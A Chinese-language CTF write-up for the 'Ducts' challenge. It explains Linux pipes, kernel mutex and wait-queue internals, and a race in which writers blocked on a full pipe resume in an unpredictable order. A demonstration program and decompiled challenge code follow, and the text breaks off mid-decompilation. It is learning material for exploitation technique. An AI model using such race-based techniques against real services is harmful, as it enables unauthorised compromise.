@\[toc\]

参考
==

[pipe(7) — Linux manual page](https://man7.org/linux/man-pages/man7/pipe.7.html)  
[Ducts challenge write-up](https://matteoschiff.com/ducts-writeup/)  
[管道读写规则和Pipe Capacity、PIPE\_BUF](https://www.cnblogs.com/alantu2018/p/8477339.html)  
[linux的阻塞和等待队列机制](https://www.cnblogs.com/gdk-0078/p/5172941.html)  
头次见到在用户态中的管道竞争，很好，学之

> 衷心感谢tpus师傅和stc4k师傅的帮助

pipe
====

### 概述

`pipe(7)` 是 Linux 系统中关于管道（pipes）和命名管道（FIFOs）的概述手册页。管道提供了一种单向的进程间通信（IPC）通道，具有读端和写端。数据从写端写入，可以从读端读出。

### 创建管道

#### 无名管道（Anonymous Pipes）

- **创建**：
    
    
    - 使用 `pipe(2)` 系统调用创建。
    - 调用 `pipe(2)` 会创建一个新的管道，并返回两个文件描述符：一个用于读端（通常为 `pipefd[0]`），一个用于写端（通常为 `pipefd[1]`）。
    - 无名管道通常用于父子进程之间的通信。
- **示例**：
    
    ```c
    #include <unistd.h>
    #include <stdio.h>
    
    int main() {
      int pipefd[2];
      char buf[100] = "Hello, pipe!";
    
      if (pipe(pipefd) == -1) {
          perror("pipe");
          return 1;
      }
    
      // 写入数据
      write(pipefd[1], buf, sizeof(buf));
    
      // 读取数据
      char read_buf[100];
      ssize_t n = read(pipefd[0], read_buf, sizeof(read_buf));
      if (n == -1) {
          perror("read");
          return 1;
      }
    
      read_buf[n] = '\0';
      printf("Read: %s\n", read_buf);
    
      // 关闭文件描述符
      close(pipefd[0]);
      close(pipefd[1]);
    
      return 0;
    }
    ```

#### 命名管道（FIFOs）

- **创建**：
    
    
    - 具有文件系统中的名称，使用 `mkfifo(3)` 函数创建。
    - 调用 `mkfifo(3)` 时需要指定路径和权限模式。
    - 使用 `open(2)` 系统调用打开，可以指定 `O_RDONLY` 或 `O_WRONLY` 标志。
    - 任何进程都可以打开 FIFO，只要文件权限允许。
- **示例**：
    
    ```c
    #include <sys/types.h>
    #include <sys/stat.h>
    #include <fcntl.h>
    #include <unistd.h>
    #include <stdio.h>
    
    int main() {
      const char *fifo_path = "/tmp/myfifo";
    
      // 创建 FIFO
      if (mkfifo(fifo_path, 0666) == -1) {
          perror("mkfifo");
          return 1;
      }
    
      // 打开 FIFO 用于写入
      int fd = open(fifo_path, O_WRONLY);
      if (fd == -1) {
          perror("open");
          return 1;
      }
    
      // 写入数据
      const char *msg = "Hello, FIFO!";
      write(fd, msg, strlen(msg));
    
      // 关闭文件描述符
      close(fd);
    
      // 删除 FIFO
      unlink(fifo_path);
    
      return 0;
    }
    ```

### I/O 操作

- **读写操作**：
    
    
    - **读操作**：
    - 如果尝试从空管道读取，`read(2)` 会阻塞，直到有数据可读。
    - 如果所有写端都被关闭，`read(2)` 会返回 0，表示文件结束。
    - **写操作**：
    - 如果尝试向已满管道写入，`write(2)` 会阻塞，直到有足够的空间。
    - 如果所有读端都被关闭，`write(2)` 会生成 `SIGPIPE` 信号，并返回 -1，设置 `errno` 为 `EPIPE`。
    - **非阻塞 I/O**：
    - 可以通过 `fcntl(2)` 的 `F_SETFL` 操作启用 `O_NONBLOCK` 标志来实现非阻塞 I/O。
    - 对于 FIFO，如果任何进程已经打开写端，读操作会返回 `EAGAIN`；否则，如果没有潜在的写进程，读操作会成功并返回空。
- **原子性**：
    
    
    - 写入小于或等于 `PIPE_BUF` 字节的数据是原子的，即数据作为一个连续的序列写入管道。
    - 写入大于 `PIPE_BUF` 字节的数据可能是非原子的，内核可能会将数据分成多个部分写入管道，这些部分之间可能会被其他进程的写操作插入数据。
    - POSIX.1 要求 `PIPE_BUF` 至少为 512 字节，Linux 中通常是 4096 字节。

### 配置选项

- **/proc 文件系统**： 
    - `/proc/sys/fs/pipe-max-size`：设置管道的最大容量（以字节为单位）。
    - `/proc/sys/fs/pipe-user-pages-hard`：设置单个非特权用户可以分配给管道缓冲区的总页面数的硬限制。
    - `/proc/sys/fs/pipe-user-pages-soft`：设置单个非特权用户可以分配给管道缓冲区的总页面数的软限制。

### 相关函数和系统调用

- **创建和管理**：
    
    
    - `pipe(2)`：创建无名管道。
    - `mkfifo(3)`：创建命名管道。
    - `open(2)`：打开命名管道。
    - `fcntl(2)`：管理文件描述符的属性。
    - `dup(2)`：复制文件描述符。
    - `close(2)`：关闭文件描述符。
- **I/O 操作**：
    
    
    - `read(2)`：从管道读取数据。
    - `write(2)`：向管道写入数据。
    - `poll(2)` 和 `select(2)`：监控多个文件描述符的状态。
    - `splice(2)` 和 `tee(2)`：高效地传输数据。
    - `vmsplice(2)`：将用户空间内存区域的内容写入管道。
- **其他**：
    
    
    - `stat(2)`：获取文件状态。
    - `unlink(2)`：删除文件。
    - `epoll(7)`：高效的 I/O 多路复用机制。
    - `fifo(7)`：命名管道的详细信息。

### 通信语义

- **字节流**： 
    - 管道提供的通信通道是一个字节流，没有消息边界的概念。
    - 数据按顺序写入和读取，但没有明确的消息分隔符。

### 示例代码

#### 无名管道示例

```c
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
    int pipefd[2];
    pid_t cpid;
    char buf[100];

    if (pipe(pipefd) == -1) {
        perror("pipe");
        exit(EXIT_FAILURE);
    }

    cpid = fork();
    if (cpid == -1) {
        perror("fork");
        exit(EXIT_FAILURE);
    }

    if (cpid == 0) {    // 子进程
        close(pipefd[1]); // 关闭写端
        ssize_t n = read(pipefd[0], buf, sizeof(buf));
        if (n == -1) {
            perror("read");
            exit(EXIT_FAILURE);
        }
        buf[n] = '\0';
        printf("Child: received '%s'\n", buf);
        close(pipefd[0]);
        exit(EXIT_SUCCESS);
    } else {            // 父进程
        close(pipefd[0]); // 关闭读端
        const char *msg = "Hello, child!";
        write(pipefd[1], msg, strlen(msg));
        close(pipefd[1]);
        wait(NULL);     // 等待子进程结束
        exit(EXIT_SUCCESS);
    }
}
```

#### 命名管道示例

```c
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
    const char *fifo_path = "/tmp/myfifo";

    // 创建 FIFO
    if (mkfifo(fifo_path, 0666) == -1) {
        perror("mkfifo");
        exit(EXIT_FAILURE);
    }

    // 父进程写入数据
    int fd = open(fifo_path, O_WRONLY);
    if (fd == -1) {
        perror("open");
        exit(EXIT_FAILURE);
    }
    const char *msg = "Hello, FIFO!";
    write(fd, msg, strlen(msg));
    close(fd);

    // 子进程读取数据
    pid_t cpid = fork();
    if (cpid == -1) {
        perror("fork");
        exit(EXIT_FAILURE);
    }

    if (cpid == 0) {    // 子进程
        fd = open(fifo_path, O_RDONLY);
        if (fd == -1) {
            perror("open");
            exit(EXIT_FAILURE);
        }
        char buf[100];
        ssize_t n = read(fd, buf, sizeof(buf));
        if (n == -1) {
            perror("read");
            exit(EXIT_FAILURE);
        }
        buf[n] = '\0';
        printf("Child: received '%s'\n", buf);
        close(fd);
        exit(EXIT_SUCCESS);
    } else {            // 父进程
        wait(NULL);     // 等待子进程结束
        unlink(fifo_path); // 删除 FIFO
        exit(EXIT_SUCCESS);
    }
}
```

### 参考资料

- `fcntl(2)`
- `intro(2)`
- `open(2)`
- `pipe(2)`
- `splice(2)`
- `tee(2)`
- `vmsplice(2)`
- `write(2)`
- `proc_sys_fs(5)`
- `fifo(7)`
- `signal(7)`

竞争点
===

[任意只读文件漏洞分析](https://xie.infoq.cn/article/c2bdf20841b48d407b1485c9a)  
在于pipe\_write

大概是第一个进程写完管道后然后放锁后其他进程都开始依次写，但都和第一个进程一样都阻塞到wait\_event\_interruptible\_exclusive了，然后才轮到读进程开始读，读完后各个进程的wait\_event\_interruptible\_exclusive都退出了，然后开始上锁再写。

那谁先能写就看哪个从wait\_event\_interruptible\_exclusive退出到上锁快了

下面详细讲讲

互斥锁
---

当然，下面是关于 `mutex_init`、`mutex_lock` 和 `mutex_unlock` 的详细解释，包括它们的工作原理和内部机制。

### 1. `mutex_init`

#### 定义

```c
#define mutex_init(mutex) \
do {                            \
    static struct lock_class_key __key;     \
                            \
    __mutex_init((mutex), #mutex, &__key);      \
} while (0)
```

#### 作用

`mutex_init` 用于初始化一个互斥锁（mutex）。它确保互斥锁处于未锁定状态，并且准备好被使用。

#### 实现

```c
void __mutex_init(struct mutex *lock, const char *name, struct lock_class_key *key)
{
    atomic_set(&lock->count, 1); // 将计数器设置为1，表示未锁定
    spin_lock_init(&lock->wait_lock); // 初始化自旋锁，用于保护等待队列
    INIT_LIST_HEAD(&lock->wait_list); // 初始化等待队列
    mutex_clear_owner(lock); // 清除所有者信息
#ifdef CONFIG_MUTEX_SPIN_ON_OWNER
    lock->spin_mlock = NULL; // 初始化自旋锁指针（如果启用了相关配置）
#endif

    debug_mutex_init(lock, name, key); // 调试信息初始化
}
```

#### 原理

- **计数器初始化**：`atomic_set(&lock->count, 1)` 将互斥锁的计数器设置为1，表示互斥锁未被锁定。
- **自旋锁初始化**：`spin_lock_init(&lock->wait_lock)` 初始化一个自旋锁，用于保护等待队列。
- **等待队列初始化**：`INIT_LIST_HEAD(&lock->wait_list)` 初始化一个链表头，用于管理等待获取互斥锁的任务。
- **清除所有者信息**：`mutex_clear_owner(lock)` 清除互斥锁的所有者信息。
- **调试信息初始化**：`debug_mutex_init(lock, name, key)` 用于调试目的，记录互斥锁的名称和类键。

### 2. `mutex_lock`

#### 定义

```c
void __sched mutex_lock(struct mutex *lock)
{
    might_sleep(); // 提示编译器该函数可能会睡眠
    /*
     * The locking fastpath is the 1->0 transition from
     * 'unlocked' into 'locked' state.
     */
    __mutex_fastpath_lock(&lock->count, __mutex_lock_slowpath);
    mutex_set_owner(lock);
}
```

#### 作用

`mutex_lock` 用于获取一个互斥锁。如果互斥锁已经被其他任务持有，当前任务将进入睡眠状态，直到互斥锁可用。

#### 实现

- **提示可能睡眠**：`might_sleep()` 提示编译器该函数可能会睡眠，确保调用者不会在禁止睡眠的上下文中调用该函数。
- **快速路径**：`__mutex_fastpath_lock(&lock->count, __mutex_lock_slowpath)` 尝试快速获取互斥锁。如果互斥锁未被锁定，则直接将计数器从1减到0，表示已锁定。如果互斥锁已被锁定，则调用慢速路径 `__mutex_lock_slowpath`。
- **设置所有者**：`mutex_set_owner(lock)` 设置互斥锁的所有者为当前任务。

#### 原理

- **快速路径**：尝试原子地将计数器从1减到0。如果成功，表示互斥锁已被当前任务获取。
- **慢速路径**：如果快速路径失败（即互斥锁已被其他任务持有），调用慢速路径 `__mutex_lock_slowpath`。慢速路径会将当前任务加入等待队列，并使当前任务进入睡眠状态，直到互斥锁可用。
- **设置所有者**：确保互斥锁的所有者信息被正确设置为当前任务。

### 3. `mutex_unlock`

#### 定义

```c
void __sched mutex_unlock(struct mutex *lock)
{
    /*
     * The unlocking fastpath is the 0->1 transition from 'locked'
     * into 'unlocked' state:
     */
#ifndef CONFIG_DEBUG_MUTEXES
    /*
     * When debugging is enabled we must not clear the owner before time,
     * the slow path will always be taken, and that clears the owner field
     * after verifying that it was indeed current.
     */
    mutex_clear_owner(lock); // 清除所有者信息
#endif
    __mutex_fastpath_unlock(&lock->count, __mutex_unlock_slowpath);
}
```

#### 作用

`mutex_unlock` 用于释放一个互斥锁。只有当前任务持有互斥锁时，才能调用此函数释放互斥锁。

#### 实现

- **清除所有者信息**：`mutex_clear_owner(lock)` 清除互斥锁的所有者信息。如果启用了调试模式，这个操作会在慢速路径中完成。
- **快速路径**：`__mutex_fastpath_unlock(&lock->count, __mutex_unlock_slowpath)` 尝试快速释放互斥锁。如果互斥锁已被当前任务持有，则直接将计数器从0加到1，表示互斥锁已解锁。如果互斥锁未被当前任务持有，则调用慢速路径 `__mutex_unlock_slowpath`。

#### 原理

- **快速路径**：尝试原子地将计数器从0加到1。如果成功，表示互斥锁已被解锁。
- **慢速路径**：如果快速路径失败（即互斥锁未被当前任务持有），调用慢速路径 `__mutex_unlock_slowpath`。慢速路径会验证互斥锁的所有者信息，并唤醒等待队列中的下一个任务。
- **清除所有者信息**：确保互斥锁的所有者信息被正确清除，以便其他任务可以获取互斥锁。

### 总结

- **`mutex_init`**：初始化互斥锁，确保其处于未锁定状态。
- **`mutex_lock`**：获取互斥锁，如果互斥锁已被其他任务持有，当前任务将进入睡眠状态，直到互斥锁可用。
- **`mutex_unlock`**：释放互斥锁，只有当前任务持有互斥锁时，才能调用此函数释放互斥锁。

pipe\_read
----------

首先启动的是读进程，此时还没有写入内容。在`pipe_read`函数中，如果管道（pipe）中没有内容可读，执行流程会处理这种情况。具体的执行流如下：

### 1. **初始状态检查**

首先，函数会锁住管道的互斥锁（`mutex_lock(&pipe->mutex)`），并且检查管道的头尾指针，判断管道是否为空。以下代码片段会执行这个检查：

```c
unsigned int head = smp_load_acquire(&pipe->head);
unsigned int tail = pipe->tail;
```

接下来的条件判断：

```c
if (!pipe_empty(head, tail)) {
    // 管道不为空的情况，处理读取
} else {
    // 管道为空的情况
}
```

如果管道为空，`pipe_empty(head, tail)`返回`true`，执行流进入“管道为空”的处理逻辑。

### 2. **检查是否有写者存在**

接下来，代码会检查是否还有写者在写入管道：

```c
if (!pipe->writers)
    break;
```

- 如果没有写者（`pipe->writers == 0`），说明不会再有数据写入，直接退出循环，函数将返回。
- 如果有写者存在，函数会继续执行。（一般是有的）

### 3. **处理非阻塞模式**

在阻塞模式和非阻塞模式下，行为会有所不同。接下来会检查文件描述符的标志：

```c
if ((filp->f_flags & O_NONBLOCK) || (iocb->ki_flags & IOCB_NOWAIT)) {
    ret = -EAGAIN;
    break;
}
```

- 如果文件描述符设置了`O_NONBLOCK`标志（非阻塞模式），或者`iocb`结构体设置了`IOCB_NOWAIT`标志，`pipe_read`会立即返回`-EAGAIN`，表示当前没有数据可读，并且不等待。（一般是阻塞）
- 如果是阻塞模式，则继续等待数据。

### 4. **解锁并等待数据**

如果是阻塞模式下，且管道为空，程序会解锁互斥锁，并进入等待状态：

```c
mutex_unlock(&pipe->mutex);
```

然后调用`wait_event_interruptible_exclusive`等待数据：

```c
if (wait_event_interruptible_exclusive(pipe->rd_wait, pipe_readable(pipe)) < 0)
    return -ERESTARTSYS;
```

- `wait_event_interruptible_exclusive`会使当前进程进入睡眠状态，直到管道变得可读（即有数据写入），或者该进程被信号中断（如`SIGINT`）。
- 如果被信号中断，函数会返回`-ERESTARTSYS`，通知调用者需要重新启动系统调用。
- 如果管道变得可读（即有数据写入），函数会再次尝试读取数据。

### 5. **重新获取互斥锁并再次检查**

等待结束后，函数重新获取管道的互斥锁：

```c
mutex_lock(&pipe->mutex);
```

然后进入循环，再次检查管道的状态，重新评估是否有数据可读。如果此时管道中有数据，则进入读取流程。

同时启动多个pipe\_write
-----------------

此时由于上锁时只能有一个上锁成功，其他都会进入互斥等待队列里，但顺序未知，然后当写满pipebuffer后进入如下

```c
  mutex_unlock(&pipe->mutex);
        if (was_empty)
            wake_up_interruptible_sync_poll(&pipe->rd_wait, EPOLLIN | EPOLLRDNORM);
        kill_fasync(&pipe->fasync_readers, SIGIO, POLL_IN);
        wait_event_interruptible_exclusive(pipe->wr_wait, pipe_writable(pipe));
        mutex_lock(&pipe->mutex);
        was_empty = pipe_empty(pipe->head, pipe->tail);
        wake_next_writer = true;
    }
```

此时解锁会导致其他进程开始获得锁，并且向阻塞的pipe\_read读进程发出信号来唤醒它，然后其他pipe\_write进程由于pipebuffer都满了，流程依然会进入到和上述一样的流程

但由于第一个pipe\_write进程释放锁后，此时互斥等待队列中的是其他pipe\_write进程，所以会其他pipe\_write会先获得锁，此时第一个pipe\_write进程会`wake_up_interruptible_sync_poll`唤醒pipe\_read读进程,然后此时pipe\_read读进程会上锁，但由于被占了，此时会放入互斥等待队列，也就是位于pipe\_write之后，然后第一个pipe\_write会将自己放入等待队列知道得到信号可写

此时其他的pipe\_write进程也会依次到`wait_event_interruptible_exclusive`然后将自己放入等待队列。

```c
if (wait_event_interruptible_exclusive(pipe->rd_wait, pipe_readable(pipe)) < 0)
            return -ERESTARTSYS;

        mutex_lock(&pipe->mutex);
        was_full = pipe_full(pipe->head, pipe->tail, pipe->max_usage);
        wake_next_reader = true;
    }
```

pipe\_read读后唤醒pipe\_write
-------------------------

```c
    }
    if (pipe_empty(pipe->head, pipe->tail))
        wake_next_reader = false;
    mutex_unlock(&pipe->mutex);

    if (was_full)
        wake_up_interruptible_sync_poll(&pipe->wr_wait, EPOLLOUT | EPOLLWRNORM);
    if (wake_next_reader)
        wake_up_interruptible_sync_poll(&pipe->rd_wait, EPOLLIN | EPOLLRDNORM);
    kill_fasync(&pipe->fasync_writers, SIGIO, POLL_OUT);
    if (ret > 0)
        file_accessed(filp);
    return ret;
}
```

当通过唤醒`wake_up_interruptible_sync_poll`唤醒pipe\_write，此时唤醒和加入等待队列机制如下

### 加入等待队列

1. **创建等待队列条目**：
    
    
    - 当调用 `wait_event_interruptible_exclusive()` 时，会初始化一个 `wait_queue_entry` 结构体。这是通过 `init_wait_entry()` 来完成的。
    - `wait_queue_entry` 的 `flags` 会标记这个等待条目是否为排他（exclusive）。
    - `private` 字段通常设置为当前进程（`current`），表示哪个任务在等待。
2. **挂入等待队列**：
    
    
    - `prepare_to_wait_event()` 函数将 `wait_queue_entry` 挂入到 `wait_queue_head` 的链表中。
    - 如果是排他等待（exclusive），条目会被添加到队列的尾部；非排他等待则被添加到头部。
    - 设置当前任务的状态为 `TASK_INTERRUPTIBLE`（如果使用 `wait_event_interruptible_exclusive`）或 `TASK_UNINTERRUPTIBLE`。

### 唤醒机制

wake\_up\_interruptible\_sync\_poll(&amp;pipe-&gt;wr\_wait, EPOLLOUT | EPOLLWRNORM);唤醒wait\_event\_interruptible\_exclusive(pipe-&gt;wr\_wait, pipe\_writable(pipe));时候\_\_wake\_up\_common的执行流程

```c
#define wake_up_interruptible_sync_poll(x, m)                   \
    __wake_up_sync_key((x), TASK_INTERRUPTIBLE, poll_to_key(m))

void __wake_up_sync_key(struct wait_queue_head *wq_head, unsigned int mode,
            void *key)
{
    if (unlikely(!wq_head))
        return;

    __wake_up_common_lock(wq_head, mode, 1, WF_SYNC, key);
}
EXPORT_SYMBOL_GPL(__wake_up_sync_key);

static int __wake_up_common_lock(struct wait_queue_head *wq_head, unsigned int mode,
            int nr_exclusive, int wake_flags, void *key)
{
    unsigned long flags;
    int remaining;

    spin_lock_irqsave(&wq_head->lock, flags);
    remaining = __wake_up_common(wq_head, mode, nr_exclusive, wake_flags,
            key);
    spin_unlock_irqrestore(&wq_head->lock, flags);

    return nr_exclusive - remaining;
}

static int __wake_up_common(struct wait_queue_head *wq_head, unsigned int mode,
            int nr_exclusive, int wake_flags, void *key)
{
    wait_queue_entry_t *curr, *next;

    lockdep_assert_held(&wq_head->lock);

    curr = list_first_entry(&wq_head->head, wait_queue_entry_t, entry);

    if (&curr->entry == &wq_head->head)
        return nr_exclusive;

    list_for_each_entry_safe_from(curr, next, &wq_head->head, entry) {
        unsigned flags = curr->flags;
        int ret;

        ret = curr->func(curr, mode, wake_flags, key);
        if (ret < 0)
            break;
        if (ret && (flags & WQ_FLAG_EXCLUSIVE) && !--nr_exclusive)
            break;
    }

    return nr_exclusive;
}

```

在 Linux 内核中，等待队列（wait queue）用于管理任务的睡眠和唤醒。当多个任务以独占方式等待在同一个等待队列上时（例如，使用 `wait_event_interruptible_exclusive`），唤醒机制在唤醒任务时会遵循一定的策略。

### 独占等待的唤醒策略

1. **队列顺序**:
    
    
    - 等待队列内部通常是一个链表结构，任务按进入的顺序排列。第一个进入队列的任务在链表的头部，最后一个进入的在尾部。
2. **唤醒顺序**:
    
    
    - `__wake_up_common` 函数在遍历等待队列时，会从头部（即最早进入的任务）开始进行检查和唤醒。因此，通常情况下，第一个被唤醒的任务是最先进入等待队列的独占任务。
3. **独占标志**:
    
    
    - 每个等待队列条目包含一个标志，指示该任务是否是独占的（通过 `WQ_FLAG_EXCLUSIVE` 标志）。
    - 在 `__wake_up_common` 中，当一个独占任务被成功唤醒后，会减少 `nr_exclusive` 计数器。
    - 一旦 `nr_exclusive` 减至零，唤醒过程会停止，这意味着只有指定数量的独占任务会被唤醒，而不是所有等待的任务。

### 具体唤醒哪个任务

- **第一个独占任务**: 在多个任务都等待的情况下，唤醒机制首先会唤醒队列中第一个具有独占标志的任务。
- **FIFO 顺序**: 因为队列是按 FIFO（先进先出）顺序管理的，所以第一个被唤醒的独占任务通常是最早调用 `wait_event_interruptible_exclusive` 并进入队列的任务。

此时由于触发`wait_event_interruptible_exclusive`然后加入等待队列的pipe\_write进程是哪个是不确定的,因为一开始解锁的pipe\_write再触发`wait_event_interruptible_exclusive`和获得锁后再解锁然后触发`wait_event_interruptible_exclusive`的进程的触发顺序是不确定的。自然开始唤醒的pipe\_write进程也不确定

但如果满足触发`wait_event_interruptible_exclusive`的pipe\_write进程是在开始解锁的pipe\_write进程之前，那么将导致下次触发开始写的进程不是接着原来的pipe\_write进程

检查
==

got表可写

调试
==

- set detach-on-fork off  
    该gdb指令是当调试父或子进程时，另一个会自动暂停在fork位置。这里使用是为了便于观察
- set follow-fork-mode parent 调试父进程
- set follow-fork-mode child 调试子进程
    
    poc
    ===

```c

#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/wait.h>
#include <sys/types.h>
#include <sys/mman.h>
#include <fcntl.h>

#define TEST_SIZE 68*1024 
#define NUM_CHILDREN 2

int main() {
    int i;
    pid_t pid;
    int *start_flag;
    char a[TEST_SIZE];

    int pipefd[2];
    int ret;

    pipe(pipefd);
    // 使用共享内存来同步
    start_flag = mmap(NULL, sizeof(int), PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
    if (start_flag == MAP_FAILED) {
        perror("mmap");
        exit(EXIT_FAILURE);
    }

    pid = fork();
   if (pid == 0)
    {   printf("read pipe apid=%d  begin\n", getpid());
        close(pipefd[1]);
        char buf[1024 * 4] = {0};
        int n = 1;
        while (1)
        {
            ret = read(pipefd[0], buf, sizeof(buf)); //当管道被写入数据，就已经可以开始读了,每次读取4k
            if (ret == 0) // 管道写端全部关闭,即读到了结尾
                break;
            printf("n=%02d pid=%d read %d bytes from pipe buf[4095]=%c\n",
                n++, getpid(), ret, buf[4095]);
        }
    }

    *start_flag = 0;  // 初始化同步标志为0

    for (i = 0; i < NUM_CHILDREN; i++) {
        pid = fork();
        if (pid == 0) {
            printf("write pipe apid=%d  begin\n", getpid());
            while (*start_flag == 0) {
                // 等待父进程设置start_flag为1
                usleep(100);
            }

            close(pipefd[0]);
            memset(a, 'A'+i, sizeof(a));
            ret = write(pipefd[1], a, sizeof(a)); // 全部写完才返回
            printf("apid=%d write %d bytes to pipe\n", getpid(), ret);
            exit(0);
        }
    }
    sleep(1);
    *start_flag = 1;
    for (i = 0; i < NUM_CHILDREN+1; i++) {
        wait(NULL);  // 等待所有子进程结束
    }
    // 释放共享内存
    if (munmap(start_flag, sizeof(int)) == -1) {
        perror("munmap");
        exit(EXIT_FAILURE);
    }
    return 0;
}
```

可以看到发现此时pipe\_write阻塞后被pipe\_read唤醒的进程是另一个进程B

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/09/attach-6f7fd69659fbccb48eb511e96723ee0bc3fcdbc5.png)

逆向
==

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  int *v3; // rax
  uint16_t port; // ax
  socklen_t addr_len; // [rsp+8h] [rbp-48h] BYREF
  socklen_t len; // [rsp+Ch] [rbp-44h] BYREF
  int server_fd; // [rsp+10h] [rbp-40h]
  int client_fd; // [rsp+14h] [rbp-3Ch]
  int pipedes[2]; // [rsp+18h] [rbp-38h] BYREF
  struct sockaddr sockaddr; // [rsp+20h] [rbp-30h] BYREF
  struct sockaddr client_addr; // [rsp+30h] [rbp-20h] BYREF
  unsigned __int64 v13; // [rsp+48h] [rbp-8h]

  v13 = __readfsqword(0x28u);
  alarm(0x3Cu);
  pipe(pipedes);
  if ( !fork() )
    backend(pipedes[0]);
  server_fd = socket(2, 1, 0);
  if ( server_fd == -1 )
  {
    puts("socket creation failed...");
    exit(1);
  }
  puts("Socket successfully created..");
  memset(&sockaddr, 0, sizeof(sockaddr));
  sockaddr.sa_family = 2;
  *(_DWORD *)&sockaddr.sa_data[2] = htonl(0);
  *(_WORD *)sockaddr.sa_data = htons(0);
  if ( bind(server_fd, &sockaddr, 0x10u) )
  {
    puts("socket bind failed...");
    exit(1);
  }
  puts("Socket successfully binded..");
  if ( listen(server_fd, 5) )
  {
    puts("Listen failed...");
    exit(1);
  }
  puts("Server listening..");
  len = 16;
  if ( getsockname(server_fd, &sockaddr, &len) )
  {
    v3 = __h_errno_location();
    printf("failed to get hostname with errno %d\n", (unsigned int)*v3);
    exit(1);
  }
  port = htons(*(uint16_t *)sockaddr.sa_data);
  printf("Port is %u\n", port);
  addr_len = 16;
  while ( 1 )
  {
    client_fd = accept(server_fd, &client_addr, &addr_len);
    if ( !client_fd )
      break;
    if ( !fork() )
      talk(client_fd, pipedes[1]);
  }
  close(server_fd);
  return 0;
}
```

```c
void __fastcall __noreturn backend(unsigned int pipe_read)
{
  int read_from_pipe_read; // [rsp+1Ch] [rbp-4h]

  first = (__int64)NULL_MESSAGE;
  last = (__int64)NULL_MESSAGE;
  devnull = fopen("/dev/null", "w");
  while ( 1 )
  {
    read_from_pipe_read = identify_incoming(pipe_read);
    if ( read_from_pipe_read == 1 )
    {
      handle_command(pipe_read);
    }
    else if ( !read_from_pipe_read )
    {
      handle_message(pipe_read);
    }
  }
}
__int64 __fastcall identify_incoming(int pipe_read)
{
  unsigned int buf; // [rsp+14h] [rbp-Ch] BYREF
  unsigned __int64 v3; // [rsp+18h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  read(pipe_read, &buf, 4uLL);
  return buf;
}
void __fastcall handle_command(int pipe_read)
{
  signed int destory_buf_len; // eax
  struct command *command; // [rsp+18h] [rbp-8h]

  command = receive_command(pipe_read);
  destory_buf_len = command->destory_buf_len;
  if ( destory_buf_len == 0xDEADC0DE )
  {
    flush_messages();
    goto LABEL_9;
  }
  if ( destory_buf_len > (int)0xDEADC0DE )
    goto LABEL_8;
  if ( destory_buf_len == 0xCAFEBABE )
  {
    redact_message((__int64)command);
    goto LABEL_9;
  }
  if ( destory_buf_len != 0xDEADBEEF )
  {
LABEL_8:
    printf("Invalid command %d", (unsigned int)command->destory_buf_len);
    goto LABEL_9;
  }
  print_messages();
LABEL_9:
  destroy_packet(command);
}
struct message *__fastcall handle_message(int pipe_read)
{
  struct message *result; // rax
  struct message *message; // [rsp+18h] [rbp-8h]

  message = receive_message(pipe_read);
  printf("Destroying message with len '%d' by %s\n", (unsigned int)message->destroy_buf_len, message->name);
  fwrite(message->destory_buf, 1uLL, (int)message->destroy_buf_len, devnull);
  if ( (void *)first == NULL_MESSAGE )
    first = (__int64)message;
  else
    *(_QWORD *)(last + 8) = message;
  result = message;
  last = (__int64)message;
  return result;
}
```

```c
void *flush_messages()
{
  void *result; // rax

  first = (__int64)NULL_MESSAGE;
  result = NULL_MESSAGE;
  last = (__int64)NULL_MESSAGE;
  return result;
}
void *__fastcall redact_message(struct command *command)
{
  void *result; // rax
  int index; // [rsp+14h] [rbp-14h]
  struct message *v3; // [rsp+18h] [rbp-10h]
  struct message *i; // [rsp+20h] [rbp-8h]

  index = 0;
  v3 = (struct message *)NULL_MESSAGE;
  for ( i = (struct message *)first; i != NULL_MESSAGE && v3 == NULL_MESSAGE; i = (struct message *)i->next )
  {
    if ( index == command->index )
      v3 = i;
    ++index;
  }
  result = NULL_MESSAGE;
  if ( v3 != NULL_MESSAGE )
  {
    v3->destroy_buf_len = 1;
    result = *(void **)command->buff;
    *(_QWORD *)v3->destory_buf = result;
  }
  return result;
}
void *print_messages()
{
  void *result; // rax
  struct message *i; // [rsp+8h] [rbp-8h]

  for ( i = (struct message *)first; ; i = (struct message *)i->next )
  {
    result = NULL_MESSAGE;
    if ( i == NULL_MESSAGE || !i )
      break;
    printf("Message %p is '%s' by %s. Next is %p\n", i, i->destory_buf, i->name, (const void *)i->next);
  }
  return result;
}
struct message *__fastcall receive_message(int pipe_read)
{
  int destroy_buf_len; // [rsp+10h] [rbp-30h] BYREF
  int index; // [rsp+14h] [rbp-2Ch]
  void *p_next; // [rsp+18h] [rbp-28h]
  struct message *message; // [rsp+20h] [rbp-20h]
  __int64 remain_len; // [rsp+28h] [rbp-18h]
  ssize_t read_bytes; // [rsp+30h] [rbp-10h]
  unsigned __int64 v8; // [rsp+38h] [rbp-8h]

  v8 = __readfsqword(0x28u);
  read(pipe_read, &destroy_buf_len, 4uLL);
  message = create_message(destroy_buf_len);
  remain_len = destroy_buf_len + 0x48LL;
  p_next = &message->next;
  index = 0;
  while ( remain_len > index )
  {
    read_bytes = read(pipe_read, p_next, remain_len - index);
    if ( read_bytes == -1 || !read_bytes )
    {
      printf("Protocol error!");
      exit(1);
    }
    index += read_bytes;
    p_next = (char *)p_next + read_bytes;
  }
  return message;
}
```

```c
struct message *__fastcall create_message(int destroy_buf_len)
{
  struct message *message; // rax

  message = (struct message *)malloc(destroy_buf_len + 0x50LL);
  message->mes_or_com = 0;
  message->next = NULL_MESSAGE;
  message->destroy_buf_len = destroy_buf_len;
  return message;
}
struct message *__fastcall create_fill_message(const void *name, const void *destroy_buf, int destroy_buf_len)
{
  struct message *message; // [rsp+28h] [rbp-8h]

  message = create_message(destroy_buf_len);
  memcpy(message->name, name, sizeof(message->name));
  memcpy(message->destory_buf, destroy_buf, destroy_buf_len);
  return message;
}
ssize_t __fastcall send_message(struct message *message, int pipe_write)
{
  return write(pipe_write, message, message->destroy_buf_len + 0x50);
}
// bad sp value at call has been detected, the output may be wrong!
void __fastcall __noreturn talk(int client_fd, int pipe_write)
{
  int v2; // eax
